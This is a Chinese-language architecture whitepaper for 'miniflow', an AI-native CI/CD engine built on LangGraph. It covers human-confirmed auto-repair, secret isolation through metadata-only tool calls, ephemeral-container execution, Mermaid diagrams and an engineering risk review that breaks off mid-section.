# miniflow AI原生轻量级CI/CD执行引擎架构与技术白皮书

## 一、项目背景与核心痛点分析

### 1.1 传统 CI/CD 的瓶颈

在当前的 DevOps 实践中，Jenkins、GitHub Actions、GitLab CI 等工具占据了主导地位。然而，这些工具对企业内部的普通开发者极不友好，普遍存在以下核心痛点：

- **"YAML 地狱"与"Groovy 门槛"**：编写正确的流水线需要极高的专业 DevOps 知识，脚本调试成本高，维护成本呈指数级上升。
- **黑盒共享库**：企业为了复用代码往往编写了大量的 Jenkins 共享库（Shared Libraries），随着时间推移，这些共享库变成了难以测试、无人敢动的"技术黑盒"。
- **故障排查低效**：当流水线报错时，开发者需要面对成百上千行的黑框日志（Stdout/Stderr）人肉寻找错误源头，开发与运维之间责权不清。

### 1.2 `miniflow` 的核心愿景

`miniflow` 旨在重构 CI/CD 的底层使用体验。项目立项之初即作为 **AI 原生（AI-Native）** 的执行引擎进行设计。它不单是在传统流水线外挂一个大模型对话框，而是**将大语言模型（LLM）的非确定性智能决策，深度嵌入到具备强隔离性、高并发、确定性的底层容器执行引擎中**。通过自然语言编排与智能化自愈，彻底抹平研发与交付之间的配置鸿沟。

## 二、核心功能的三阶段递进策略与工程论证

从工程落地难度、资损风险控制及用户信任建立的实战视角出发，我们将产品核心功能的演进方向调整为**逆向落地策略**：

```
阶段一：报错分析与自动修复提示  ──►  阶段二：自然语言编排流水线  ──►  阶段三：自定义Step脚本生成
(只读/低风险/最佳MVP)                (结构化写场景/规则内框定)            (高风险/强隔离沙箱/人工闭环)
```

### 2.1 三阶段详细论证与对比

| 功能维度 | 核心职责 | 工程难度 | 风险等级 | 实战落地技术策略 |
| :--- | :--- | :--- | :--- | :--- |
| **阶段一：报错分析与自动修复提示** | 捕获运行时日志，利用大模型定位基础设施配置错误，给出修复建议并支持一键重试。 | **低**（只读场景） | **极低**（不污染线上环境） | 1. 拦截 Stdout/Stderr 错误日志；<br>2. 经过敏感信息脱敏过滤器；<br>3. 结合平台知识库（RAG）输入大模型生成修复卡片。 |
| **阶段二：自然语言编排流水线** | 接收用户模糊的自然语言需求，结合平台提供的合法插件库（Plugins），编排出标准的流水线。 | **中**（写场景，但有规则） | **低**（图语法有硬编码校验） | 1. 将平台所有插件与参数定义为标准的 JSON Schema；<br>2. 激活大模型的 **Structured Output**（结构化输出）能力；<br>3. 强约束 LLM 仅做规则内的参数绑定。 |
| **阶段三：自定义 Step 脚本生成** | 允许用户通过自然语言让大模型直接生成任意的 Shell 或 Python 脚本并在流水线中执行。 | **高**（任意代码执行） | **高**（存在被提示词注入攻击、清空宿主机的风险） | 1. 建立极其严格的底层沙箱隔离环境（如 Dind 或 MicroVM）；<br>2. 引入运行时白名单机制；<br>3. 初期必须实施强有力的人工确认（Human-in-the-loop）UX 链路。 |

---

## 三、系统架构与 LangGraph 智能调度设计

### 3.1 核心架构蓝图

`miniflow` 采用**控制面（Control Plane）**与**数据面/运行时（Runtime）**严格解耦的架构：

1. **控制面（AI Agent 调度中心）**：基于 **LangGraph** 框架构建。因为 CI/CD 流程本质上是一个复杂的、具备自愈回溯可能性的状态机。
2. **数据面（高性能执行引擎）**：由原生语言（如 Go/Rust）编写的 Worker 节点组成，负责接收控制面下发的确定性 JSON 任务描述，并调度底层容器运行。

### 3.2 LangGraph 智能体状态机设计

引入 AI 自愈能力的流水线，打破了传统的 DAG（有向无环图）只能一路向前的限制，使其演变成一个**具备回溯能力的环状图（Graph with Loops）**。

#### 3.2.1 共享状态定义（State）

```python
class PipelineState(TypedDict):
    user_requirement: str        # 用户原始自然语言需求
    available_plugins: list      # 平台当前注册并受信任的插件元数据列表
    current_dag: dict            # 当前生成的标准 JSON 拓扑图 (Nodes & Edges)
    execution_logs: str          # 运行时产生的最新一步脱敏错误日志
    retry_count: int             # 自动修复重试计数器
    auto_fix_enabled: bool       # 是否开启自动驾驶模式的开关配置
    status: str                  # 运行状态: pending / running / failed / success
```

#### 3.2.2 核心智能节点（Nodes）逻辑

- **Planner Node（规划者）**：分析 `user_requirement`，对照 `available_plugins` 的 Schema，输出一个 100% 合法的流水线拓扑 JSON。
- **Validator Node（硬编码校验者）**：通过传统的 JSON Schema 校验器，对大模型生成的 JSON 进行强类型和依赖关系的硬编码检查，不通过则直接转给 `Fixer`，绝不把垃圾数据丢给运行时。
- **Fixer Node（修复者）**：当运行时报错并传回 `execution_logs` 时激活。大模型分析错误日志，推导故障原因，并修改 `current_dag` 状态。

### 3.3 渐进式信任机制（Copilot to Autopilot）

为了解决企业落地时对大模型安全性的不信任，系统设计了**路由级别（Conditional Edge）的安全开关**：

- **Copilot 模式（默认，`auto_fix_enabled = False`）**：`Fixer` 生成修复方案后，LangGraph 进入挂起（Interrupt）状态，将修复前后的 JSON 对比卡片推送到前端，必须由人类工程师点击[确认修复]后才继续向下执行。
- **Autopilot 模式（`auto_fix_enabled = True`）**：在开发或测试环境，允许系统跳过审核，自动将修改后的 JSON 配置重新喂给运行时引擎进行自愈。
- **数据闭环资产**：人类在 Copilot 模式下的[确认]与[拒绝]行为，将作为 `Positive/Negative Feedback` 数据对持久化存储，这是后续微调企业专属交付小模型（Fine-tuning）的核心数据资产。
- **安全熔断机制**：为防止 AI 陷入"报错->修改->又报错->又修改"的死循环无限消耗 Token，系统在状态机中硬编码了 `retry_count > 3` 的强制熔断路由，超过次数直接报错交还人类控制。

## 四、UI/UX 交互形态设计决策

### 4.1 画布 + 侧边栏（Canvas + Sidebar）形态

经深度评估，`miniflow` 否决了类似于 ChatGPT 的"纯聊天对话框"设计，全面拥抱 **"可视化画布 + 智能侧边栏"** 的交互方案。

### 4.2 决策深度论证

#### 为什么纯聊天框（Chat Mode）在 CI/CD 场景是灾难？

1. **信息密度极低，缺乏掌控感**：流水线是一个具备拓扑结构（DAG）的工程实体。AI 在聊天框里吐出几十行 JSON 或复杂的文本解释，用户需要人肉去推导节点之间的依赖关系，这与"降低门槛"的初心背道而驰。
2. **局部微调极度痛苦**：如果大模型帮用户生成了 10 个步骤的流水线，仅有第 5 步的一个镜像标签错误。在纯聊天框模式下，用户必须指挥 AI："把第 5 步的标签改掉"。大模型重写整段代码时，由于其非确定性特点，极有可能在重写时把原本正确的第 8 步改错（幻觉污染）。

#### 为什么"画布 + 侧边栏"是降维打击的体验？

1. **所见即所得的确定性**：用户在侧边栏输入："帮我写一个 Go 项目打包并推送到生产环境的流水线"。右侧的画布上像动画一样实时长出 4 个带有箭头的节点。用户对整个图结构拥有 100% 的视觉掌控力。
2. **精准的局部上下文聚焦**：用户对某一步不满意时，直接点击画布上的这个具体节点（Node），侧边栏的 AI 助理会立刻将上下文聚焦（Focus）到该节点的参数。用户说："把这一步的并发数改成 4"，AI 仅精准修改这一个节点的 JSON 片段，画布局部刷新。
3. **沉浸式排错与自愈体验**：当流水线跑失败时，画布上的错误节点直接"变红"。用户点击红色节点，侧边栏上半部分展示经过**脱敏解析后的纯净日志**，下半部分是 AI 针对该节点的**修复建议卡片**，并附带一个醒目的 **[一键应用并重试]** 按钮。

## 五、业务边界与产品定位规范

为了确保项目的快速落地，避免陷入无限大模型调优的科研泥潭，`miniflow` 的 AI 能力划定了清晰的**责权边界**。

### 5.1 聚焦"平台配置与基础设施层"

AI 的核心使命是解决"开发者懂自己的代码，但不懂（也不想懂）复杂的 CI/CD 基础设施"这一核心错位。

### 5.2 边界划分与日志分类器（Log Classifier）设计

系统在数据面数据返回时，必须部署一个确定性的分类层。当 Step 执行失败时，根据日志特征分流：

```
                        ┌────────────────── 运行时 Step 失败 ──────────────────┐
                        │                                                      │
                        ▼                                                      ▼
             【模式 A：应用代码报错】                                【模式 B：基础设施与配置报错】
        (检测到 panic:, SyntaxError, NullPointer)               (检测到 401, Connection Refused, no such image)
                        │                                                      │
                        ▼                                                      ▼
             AI 侧边栏仅做【只读】文字解释                             触发 LangGraph 的【读写】修复流
             (责任属于用户，不触发自动修复)                            (自动寻找可用凭证、修改配置、提供修复卡片)
```

1. **安全与法律合规（减少资损责任）**：大模型去修改用户的业务代码风险不可控（可能引入逻辑漏洞导致线上资损）。而修改基础配置（如 `Docker Image Tag` 或者是 `K8s Namespace`）风险完全在平台规则框架内。
2. **投资回报率（ROI）最大化**：业务代码的语法错误，用户在 IDE 内即可快速修正；而私有 Maven 源连不上、集群凭证过期等环境问题，才是阻碍研发吞吐量的最大绊脚石。

## 六、企业资产元数据与安全隔离方案

系统绝对不能直接把企业真实的密码、Token 喂给大模型（防止提示词注入攻击导致密钥泄漏）。

### 6.1 系统架构设计：环境变量引导 + 动态元数据工具化（Tool Calling）

- **系统级别参数（Docker 环境变量）**：符合 12-Factor 原则。大模型的 API Key、系统数据库连接串等硬配置，通过 Docker 环境变量或宿主机 `.env` 文件静态注入，不对外暴露。
- **企业资产层（影子元数据 Tool 方案）**：在后端（Go/Rust）维护一个安全的资产管理数据库。LangGraph 中的 AI Agent 无法直接访问资产值，只能通过 **Function Calling** 调用只读的 `get_available_secrets()` 工具，获取不含敏感信息的"元数据影子"。

### 6.2 影子元数据 JSON Schema 示例

当大模型检测到"Harbor 镜像仓库推送 401 无权限"时，它通过 Tool Calling 拿到的返回结构如下：

```json
[
  {
    "secret_id": "harbor-prod-token",
    "type": "username_password",
    "description": "用于推送到生产环境 Harbor 镜像仓库的凭证",
    "associated_domain": "registry.company.com"
  },
  {
    "secret_id": "k8s-kubeconfig-test",
    "type": "file",
    "description": "测试环境 K8s 集群的部署凭证",
    "associated_domain": "10.0.0.1"
  }
]
```

大模型根据 `associated_domain` 进行规则匹配，发现 `harbor-prod-token` 符合当前失败节点的域名需求。它要做的事情**仅仅是修改流水线的配置 JSON，将该节点的 `credential_id` 字段值填入 `"harbor-prod-token"`**。真实的敏感密码始终锁在后端安全域中，实现 AI 时代的彻底安全隔离。

## 七、运行时（Runtime）模式决策

### 7.1 隔离方案：共享工作空间 + 临时容器（Shared Workspace + Ephemeral Containers）

`miniflow` 的数据面执行引擎采用主流且现代化的架构：**控制面动态解析 JSON 拓扑，为每一个 Step 在宿主机上开辟一个共享的临时工作空间（Workspace），并为每个步骤动态拉起一个独立的临时容器挂载该空间进行隔离跑脚本。**

### 7.2 决策论证与 AI 原生维度的特殊考量

#### 为什么这是 AI 原生 CI/CD 的"唯一正确解"？

1. **极大缩小了 AI 的"排错搜索空间"**：若多步骤混在宿主机跑，Step 2 失败可能是因为 Step 1 偷偷改了全局环境变量。这种"环境污染"会让大模型在分析日志时完全抓瞎。而在临时容器隔离模式下，Step 2 报错，AI 能 100% 确定：**错误只可能由该步骤的容器镜像、输入的参数、或共享目录下的文件引起**。变量被严格锁死，LangGraph 的 Fixer 节点分析准确率会直线飙升。
2. **状态的完美可复制性（Reproducibility）**：由于容器是临时的、声明式的（由控制面的 JSON 定义），当 AI 尝试自动修复时，它可以让引擎**一键销毁当前失败的容器，重新拉起一个全新、干净的环境进行重试**。这种"完美复原"的能力是传统宿主机执行模式无法企及的。

### 7.3 工程落地硬伤与防范机制

- **文件权限地狱（Permission Denied）**
  - **痛点**：Step 1（如 root 运行的容器）拉取了源码并创建文件，Step 2（如以 node 用户运行的容器）进去修改时会直接抛出 `Permission denied` 错误。
  - **防范机制**：`miniflow` 执行引擎在调用容器 API 挂载目录时，后端必须统一处理、强行复写或动态映射容器内外的 **UID/GID** 权限。
- **冷启动延迟（Cold Start Time）**
  - **痛点**：每个步骤都要临时 `docker run`，若本地无镜像会导致流水线变慢。
  - **防范机制**：内置轻量级预热机制，在流水线被 Planner 编排出来的瞬间，后端异步在 Worker 节点上执行 `docker pull` 进行镜像预热。
- **依赖包缓存丢失（Cache Tooling）**
  - **痛点**：临时容器生命周期短暂，像 `node_modules` 或 `.m2` 缓存若每次重新下载会严重拖慢效率。
  - **防范机制**：控制面 JSON 必须支持定义 `cache` 挂载策略，引擎自动在宿主机上为该项目维护持久化的 cache 目录，并作为只读/读写卷动态挂载到临时容器的对应缓存路径下。

---

## 八、架构设计图（Mermaid）

为辅助理解上述文字内容，以下从三个不同视角提供可视化架构图。

### 8.1 整体分层架构图（系统全景）

此图展示 miniflow 从用户交互层到容器执行层的完整组件栈，包含每层之间的核心数据流关系。

```mermaid
graph TB
    %% ========== 样式定义 ==========
    classDef userLayer fill:#e1f5fe,stroke:#0288d1,stroke-width:2px
    classDef gatewayLayer fill:#fff3e0,stroke:#f57c00,stroke-width:2px
    classDef controlLayer fill:#e8f5e9,stroke:#388e3c,stroke-width:2px
    classDef knowledgeLayer fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef securityLayer fill:#fff0f0,stroke:#d32f2f,stroke-width:2px
    classDef runtimeLayer fill:#fce4ec,stroke:#c2185b,stroke-width:2px
    classDef executionLayer fill:#fff8e1,stroke:#f9a825,stroke-width:2px
    classDef critical styl fill:#ffebee,stroke:#b71c1c,stroke-width:3px,stroke-dasharray:5 5

    %% ========== 用户交互层 ==========
    subgraph User["👤 用户交互层"]
        Canvas["🖥️ 可视化画布 Canvas<br/>DAG 拓扑实时渲染<br/>节点选中 / 拖拽 / 标红"]
        Sidebar["💬 智能侧边栏 Sidebar<br/>自然语言输入 / 节点聚焦编辑<br/>修复卡片 / 日志展示"]
    end

    %% ========== API 网关层 ==========
    subgraph Gateway["🌐 API 网关层"]
        WS["WebSocket 实时推送<br/>画布增量更新 / 状态推送"]
        REST["REST API<br/>CRUD / 历史记录 / 配置"]
    end

    %% ========== AI 控制面 ==========
    subgraph Control["🧠 AI 控制面（LangGraph 状态机）"]
        direction TB
        Planner["📋 Planner 规划节点<br/>LLM: user_requirement → JSON DAG"]
        Validator["✅ Validator 硬编码校验<br/>JSON Schema 强类型 + 依赖检查"]
        Fixer["🔧 Fixer 修复节点<br/>LLM: execution_logs → config fix"]
        State["📦 PipelineState 共享状态<br/>requirement / dag / logs / retry"]
        Router{"🔀 条件路由<br/>Copilot vs Autopilot"}
        Interrupt["⏸️ Human Interrupt<br/>等待人工确认"]

        Planner --> Validator
        Validator -->|校验通过| Router
        Validator -->|校验失败| Fixer
        State -.-> Planner
        State -.-> Fixer
        Fixer -->|retry_count ≤ 3| Router
        Fixer -->|retry_count > 3| Fuse["🔴 熔断 Stop"]
        Router -->|Copilot| Interrupt -->|确认| Fixer
        Router -->|Autopilot| Fixer
    end

    %% ========== 知识库层 ==========
    subgraph Knowledge["📚 知识库与工具体系"]
        RAG["🔍 RAG 知识检索<br/>错误日志 → 相似案例 → 修复策略"]
        PluginReg["🧩 插件注册中心<br/>所有合法 Step 的 JSON Schema"]
        FeedbackDB["📊 反馈数据资产库<br/>Positive / Negative 样本<br/>(后续 Fine-tuning)"]
    end

    %% ========== 安全隔离层 ==========
    subgraph Security["🔒 安全隔离层"]
        LogSanitizer["🧹 日志脱敏过滤器<br/>Strip Token / Password / IP"]
        ShadowMeta["👻 影子元数据 Tool<br/>get_available_secrets()<br/>返回: secret_id / domain"]
        SecretVault["🔐 安全保险库<br/>真实凭证明文<br/>(后端私域, LLM 不可达)"]
    end

    %% ========== 数据面运行时 ==========
    subgraph Runtime["⚡ 数据面运行时引擎"]
        WorkerPool["🏭 Worker 节点池<br/>Go / Rust 原生编译<br/>高并发非阻塞 I/O"]
        ContainerMgr["📦 容器生命周期调度<br/>docker create / start / stop / rm<br/>镜像预热 pull"]
        CacheVol["💾 持久化缓存卷<br/>node_modules / .m2 / pip<br/>跨 Step 共享"]
    end

    %% ========== 执行沙箱 ==========
    subgraph Execution["🔄 执行沙箱（Step 粒度）"]
        SharedWS["📁 共享工作空间<br/>Volume: /workspace/{pipeline_id}"]
        Step1["Step 1: git clone<br/>⚡ 临时容器 → exit → 销毁"]
        Step2["Step 2: mvn package<br/>⚡ 临时容器 → exit → 销毁"]
        Step3["Step 3: docker push<br/>⚡ 临时容器 → exit → 销毁"]
    end

    %% ========== 数据流连线 ==========
    User -->|自然语言 / 点击| Gateway
    Gateway -->|WebSocket JSON| Control
    Control -->|检索相似案例| RAG
    Control -->|获取插件 Schema| PluginReg
    Control -->|保存反馈| FeedbackDB
    Control -->|脱敏后的日志| LogSanitizer
    LogSanitizer -->|纯净日志| Control
    Fixer -.->|tool_call: 查询影子| ShadowMeta
    ShadowMeta -.->|只读接口| SecretVault
    Control -->|JSON DAG 任务| WorkerPool
    WorkerPool -->|编排容器| ContainerMgr
    WorkerPool -->|挂载缓存| CacheVol
    ContainerMgr -->|创建临时容器| Execution
    Step1 --> SharedWS
    Step2 --> SharedWS
    Step3 --> SharedWS

    %% ========== 高亮关键路径 ==========
    class Fuse,Interrupt critical
```

### 8.2 LangGraph 智能体状态机流程图

此图聚焦 AI 控制面内部的状态流转，展示 Planner → Validator → Fixer 之间的条件路由、Copilot/Autopilot 模式切换、以及熔断机制。

```mermaid
flowchart TD
    classDef startEnd fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px
    classDef process fill:#e3f2fd,stroke:#1565c0,stroke-width:2px
    classDef decision fill:#fff3e0,stroke:#e65100,stroke-width:2px
    classDef subgraphStyle fill:#f5f5f5,stroke:#9e9e9e,stroke-width:1px,stroke-dasharray:5 5
    classDef endState fill:#fce4ec,stroke:#c62828,stroke-width:2px
    classDef copilotStyle fill:#fff8e1,stroke:#f9a825,stroke-width:2px

    Start((🔵 开始)) --> INPUT[🔌 用户输入]

    subgraph Planner["📋 Planner 规划"]
        direction TB
        P1["调用大模型: 解析需求+插件Schema"] --> P2["生成 JSON DAG 拓扑"]
    end

    INPUT --> Planner

    subgraph Validator["✅ Validator 校验"]
        direction TB
        V1["JSON Schema 强类型校验"] --> V2_1{校验结果}
        V2_1 -->|✅ 通过| V3["Pass: 输出合法 DAG"]
        V2_1 -->|❌ 不合规| V4["Fail: 拒绝输出"]
    end

    Planner -->|JSON DAG| Validator

    Validator -->|校验通过| Runtime
    Validator -->|校验失败| Fixer

    subgraph Runtime["⚡ Runtime 执行"]
        direction TB
        R1["docker run step"] --> R2{执行结果}
        R2 -->|正常运行| R3["StepSuccess ✅"]
        R2 -->|报错退出| R4["StepFail ❌"]
    end

    Runtime -->|全部步骤完成| Success[✅ 成功结束]
    Runtime -->|某步骤报错| Classifier

    subgraph Classifier["🔀 Log Classifier"]
        direction TB
        C1{日志模式匹配}
        C1 -->|panic / SyntaxError / NullPointer| C2["模式A: 应用代码错误"]
        C1 -->|401 / ConnectionRefused / no such image| C3["模式B: 基础设施错误"]
    end

    Classifier -->|模式A - 只读| READONLY["📖 只读解释说明"]
    READONLY --> EndRead((🔚 结束))

    Classifier -->|模式B - 触发修复流| Fixer

    subgraph Fixer["🔧 Fixer 修复"]
        direction TB
        F1["LLM 分析脱敏日志"] --> F2["Tool Calling: 查询影子元数据"]
        F2 --> F3["匹配 associated_domain → 修改配置"]
        F3 --> F4["生成修复后 JSON"]
    end

    Fixer -->|retry_count ≤ 3| Router{"🔀 路由选择"}
    Router -->|Copilot 模式| Interrupt["⏸️ Human Interrupt 等待确认"]

    subgraph Copilot["👤 Copilot 模式"]
        direction LR
        HW{{"开发者审核修复建议卡片"}} -->|点击「确认修复」| HP["应用修复并重试"]
        HW -->|点击「忽略」| HS["放弃修复"]
    end

    Interrupt --> Copilot
    HP --> Runtime
    HS --> Success

    Router -->|Autopilot 模式| AutoApply["🔄 自动应用修复"]
    AutoApply --> Runtime

    Fixer -->|retry_count > 3| Fuse["🔴 熔断 Stop"]
    Fuse --> EndFuse((🔚 报错交还人类))

    class Start,Success,EndRead,EndFuse startEnd
    class INPUT,READONLY process
    class Router,Fuse,Interrupt decision
    class HW copilotStyle
```

### 8.3 单步执行时序图（端到端数据流）

此图追踪一次完整的用户交互 → AI 编排 → 执行 → 报错 → 自动修复 → 重试成功的全链路时序，精确到组件间通信。

```mermaid
sequenceDiagram
    %% 参与者定义
    participant U as 👤 开发者
    participant C as 🖥️ Canvas UI
    participant S as 💬 Sidebar AI
    participant LG as 🧠 LangGraph
    participant LLM as 🤖 大模型
    participant V as ✅ Validator
    participant W as ⚡ Worker
    participant D as 📦 Docker
    participant SV as 🔐 Secret Vault

    %% Phase 1: 编排阶段
    Note over U,SV: ═══ 阶段一：自然语言编排 ═══
    U->>S: "帮我写一个 Go 项目 CI 流水线"
    S->>LG: 转发自然语言需求
    LG->>LLM: Planner: 解析需求 + 插件 Schema
    LLM-->>LG: 返回 JSON DAG 拓扑
    LG->>V: Validator: 硬编码校验
    V-->>LG: 校验通过 ✅
    LG->>C: 推送 DAG 到画布
    C-->>U: 可视化渲染（检出→测试→构建→部署）

    %% Phase 2: 局部微调
    Note over U,SV: ═══ 阶段二：局部聚焦微调 ═══
    U->>C: 点击第3个节点（构建）
    C->>S: 聚焦该节点上下文
    S-->>U: 展示节点参数面板
    U->>S: "把Go版本改成1.22"
    S->>LG: 精准修改该节点的 JSON 片段
    LG->>C: 画布局部刷新

    %% Phase 3: 执行
    Note over U,SV: ═══ 阶段三：执行 → 报错 → 自愈 ═══
    U->>C: 点击「执行」
    C->>LG: 下发调度指令
    LG->>W: 逐 Step 下发 JSON 任务

    W->>D: docker run --rm step1
    D-->>W: ✅ 步骤成功
    W->>D: docker run --rm step2
    D-->>W: ❌ exit 1（Harbor 401）
    W->>LG: 返回原始 execution_logs

    LG->>LG: Log Classifier 分类
    Note over LG: 识别为【基础设施错误】，触发修复流

    LG->>LLM: Fixer: 分析错误日志
    LLM-->>LG: 推断为 Harbor 凭证过期

    LG->>SV: tool_call: get_available_secrets()
    SV-->>LG: 影子元数据（secret_id / domain）
    Note over LG: 匹配 associated_domain → harbor-prod-token

    LG->>LLM: 生成修复方案
    LLM-->>LG: 修改 credential_id 字段

    alt Copilot 模式（默认）
        LG->>S: 推送修复建议卡片
        S->>C: 画布节点标红 🔴
        C-->>U: 显示错误位置 + AI 修复建议
        U->>S: 点击「一键应用并重试」
        S->>LG: 确认修复
    else Autopilot 模式
        LG->>LG: 自动应用修复
    end

    LG->>W: 下发修正后的 JSON
    W->>D: docker run --rm step2（重试）
    D-->>W: ✅ 步骤成功
    W->>D: docker run --rm step3
    D-->>W: ✅ 全部成功
    W->>LG: 流水线完成
    LG->>C: 推送完成状态
    C-->>U: 全部节点变绿 ✅

    Note over U,SV: ═══ 阶段四：数据闭环 ═══
    Note over LG: 保存 Positive Feedback 样本<br/>(用于后续 Fine-tuning)
```

### 8.4 图说与使用指引

| 图号 | 名称 | 最佳用途 |
|:---:|:---|:---|
| 8.1 | 整体分层架构图 | 快速理解系统全貌、各层职责与组件间数据流，适合技术评审和 onboarding |
| 8.2 | 状态机流程图 | 理解 AI 控制面的决策逻辑：何时修复、何时挂起、何时熔断，适合开发实现参考 |
| 8.3 | 单步执行时序图 | 追踪一条完整的端到端请求链路，适合排障和性能分析 |

> **建议阅读顺序**：先看 8.1 建立全局认知 → 再看 8.2 理解 AI 核心决策流程 → 最后看 8.3 追踪具体请求链路。

---

## 九、架构可行性评估与技术风险白皮书

本文档基于对上述架构设计的全面审查，从工程落地角度评估各阶段可行性，识别技术风险，并给出具体应对建议。

### 9.1 整体评估结论

**工程总体可行，但三阶段之间的难度跨度极大，不可等同视之。**

该架构在核心思辨上非常成熟：控制面/数据面解耦、渐进式信任机制、影子元数据安全方案、Canvas + Sidebar 交互否决——这些设计决策方向均正确。然而，从设计文档到可运行的工程系统，仍有多个被低估的工程深水区。

### 9.2 设计亮点回顾（已被充分论证的稳健决策）

以下为文档中已经论证充分、应当坚持的设计决策：

| 设计决策 | 稳健性论证 |
| :--- | :--- |
| **三阶段逆向落地策略** | 从只读报错分析起步→结构化编排→高风险代码生成。先建立信任，再扩大能力边界，符合企业级 AI 产品的必由路径。 |
| **Validator 硬编码守门员** | LLM 输出的 JSON 必须经过 JSON Schema 强类型校验，校验不通过直接走 Fixer 循环，绝不将垃圾数据递送给运行时。这是防止 AI 幻觉传递到执行层的核心安全屏障。 |
| **影子元数据方案** | `get_available_secrets()` 仅返回 `secret_id`/`description`/`associated_domain`，真实凭据锁在后端安全域中，LLM 不可达。该方案在当前 AI 安全实践中属于领先且务实的设计。 |
| **Log Classifier 分流逻辑** | 应用代码报错（只读解释）与基础设施报错（可自动修复）的分离，既控制资损风险，又将 AI 修复能力聚焦于 ROI 最高的场景。 |
| **Canvas + Sidebar UI 否决纯聊天框** | 文档第 4 章关于"局部微调时 AI 重写整段代码导致幻觉污染"的论证，以及对信息密度的分析，在同类产品的 UX 实践中已被反复验证。 |
| **熔断机制** | `retry_count > 3` 硬编码熔断，防止 AI 陷入"报错→修改→再报错"的无限循环，是成本控制和系统稳定的底线保障。 |

### 9.3 技术风险深度分析

#### 9.3.1 【高风险】LangGraph 状态机的中断与恢复

**问题描述**

文档设计了 Fixer → Router → Interrupt → Fixer 的状态循环，以及 Copilot 模式下的人工确认挂起。但在实际工程中，状态机的中断（Interrupt）与恢复（Resume）涉及多个复杂边界条件：

1. **部分执行后的重试语义**：流水线执行到 Step 3 失败，Step 1-2 已成功。共享 Workspace 中的中间产物（编译后的二进制、下载的依赖）在容器销毁后保留在宿主机。但 Step 2 已执行的副作用（如 `docker push` 推送了镜像、已向部署环境发出了请求）是否需要回滚？系统对此的语义模型必须精确定义。
2. **中断后状态持久化**：`PipelineState` 当前设计为 `TypedDict`（内存对象）。若中断期间 Worker 进程重启，或人工审批等待了数小时，内存状态会丢失。系统需要将 State 序列化到持久化存储中。
3. **人工修改 DAG 后的一致性**：Copilot 模式下，工程师不仅可以选择"确认修复"，还可能手动编辑 DAG（例如删除某个失败步骤）。编辑后的 DAG 与已执行步骤之间的状态一致性需要校验。

**应对建议**

- **初期 Phase 2 仅支持"从失败步骤开始全量重跑"**，不做"基于已有产物的增量重试"。这避免了状态一致性问题，降低首个版本的实现复杂度。
- 引入持久化 State Store（推荐 PostgreSQL），将 `PipelineState` 在每个关键节点后落盘。
- 若用户在 Copilot 模式下手动编辑 DAG，Validator 需要新增**回滚兼容性检查**：确认修改后的 DAG 与已执行的步骤之间没有矛盾。

---

#### 9.3.2 【中高风险】容器运行的工程实现陷阱

**问题描述**

文档识别了文件权限问题和缓存丢失问题（7.3 节），但以下问题同样需要工程预案：

1. **UID/GID 映射难题**：Step 1 以 root 运行的容器创建了文件（属主 `root:root`），Step 2 以 `node` 用户（UID 1000）运行的容器挂载同一 Workspace 目录时，会遭遇 `Permission denied`。文档提出的"后端统一处理 UID/GID"，在实践中需要处理以下场景：
   - 不同基础镜像（`ubuntu`, `node:20`, `golang:1.22`, `maven:3`）的默认用户 UID 各不相同
   - 部分镜像使用 `USER` 指令切换用户，部分使用 `--user` 参数，行为不一致
   - Go 的 Docker SDK 不提供透明的 UID 映射能力，需要额外的 `nsenter` 或 `chown` 前置步骤
2. **缓存卷的并发安全性**：多个流水线同时挂载同一个 `node_modules` 或 `.m2` 缓存目录时，并发写入可能导致缓存损坏。npm 和 pip 都不是并发安全的包管理器。
3. **Docker Daemon 的资源竞争**：多个 Worker 同时调用 `docker run / build / pull` 时，Docker Daemon 会成为瓶颈。大量并发 `docker pull` 可能导致磁盘 I/O 和网络带宽竞争。

**应对建议**

- **统一容器 UID 策略**：要求 Worker 节点上的所有容器以 **UID 1000:1000** 运行。在容器启动前，通过嵌入式初始化脚本（init container）对共享 Workspace 做 `chown -R 1000:1000`。约束在开发者文档中注明：基础镜像必须支持 `--user 1000` 运行。
- **缓存卷使用读写锁**：同一流水线的串行步骤之间使用文件锁（flock）；不同流水线之间设置为只读挂载（`:ro`），仅流水线本身的 Step 写缓存。
- **Worker 实现镜像预热队列**：文档 7.3 已提及预热机制，需要将其实现为 Worker 的一个独立 goroutine/async task 池，在 Planner 生成 DAG 后立即异步执行 `docker pull`，减少 Step 启动时的等待。

---

#### 9.3.3 【中风险】日志脱敏的工程复杂度被低估

**问题描述**

文档 6.1 节提出"日志脱敏过滤器"的概念，但在工程实践中，CI/CD 日志脱敏是一个远比想象中困难的 NLP + 安全工程问题：

1. **凭证格式的多样性**：AWS Access Key（`AKIA...`）、SSH Private Key（`-----BEGIN OPENSSH PRIVATE KEY-----`）、Bearer Token（`Bearer eyJ...`）、Basic Auth（`user:password@host`）、`settings.xml` 中的 Maven 仓库密码、`.npmrc` 中的 `_authToken`——每种格式需要不同的正则模式。
2. **嵌套编码问题**：Base64 编码的 JSON 中含有 Token，JSON 中又有 URL-encoded 的密码（例如 `echo ZGItcGFzczogJDJiJDEwJEhXZVN4...` 这样的 Docker BuildKit 输出）。单层正则脱敏无法处理嵌套编码。
3. **脱敏的两个错误方向**：
   - **漏脱敏（False Negative）**：敏感信息通过脱敏层进入 LLM，可能被训练记忆或 Prompt Injection 泄露
   - **误脱敏（False Positive）**：将 `sha256:a1b2c3d4` 镜像 Digest 误识别为 Token 并脱敏，导致 LLM 无法正确分析问题
4. **不同工具的日志格式差异**：Maven、Gradle、npm、pip、Docker BuildKit、kubectl——每个工具的错误输出格式完全不同，脱敏规则需要逐工具维护。

**应对建议**

- **分层脱敏策略**：
  - **第一层（快速正则层）**：覆盖 Top 20 种常见凭证格式（AWS Key、Bearer Token、Basic Auth、SSH Key、Docker Config JSON 等），匹配即替换为 `***REDACTED***`
  - **第二层（启发式规则层）**：对高熵字符串（长度 > 20，字符分布均匀）进行熵检测，高熵内容脱敏
  - **第三层（人工复审通道）**：对 LLM 将要发送的日志内容在前端展示，允许用户在点击"发送给 AI 分析"前手动检查
- **MVP 阶段不要追求完美脱敏**。先做第一层正则覆盖 Top 80% 场景，后续通过用户反馈标记漏脱敏案例，逐步扩充规则库。

---

#### 9.3.4 【中风险】Validator 的语义验证缺失

**问题描述**

文档 3.2.2 节指出 Validator 做"JSON Schema 校验 + 依赖关系检查"，但 LLM 生成的 DAG 可能通过语法校验却在语义层面存在严重错误：

1. **插件存在性错误**：Step 2 引用的插件 `docker-build` 在生产环境的插件注册中心中不存在（仅存在于测试环境），而 Validator 只检查了 JSON 结构格式
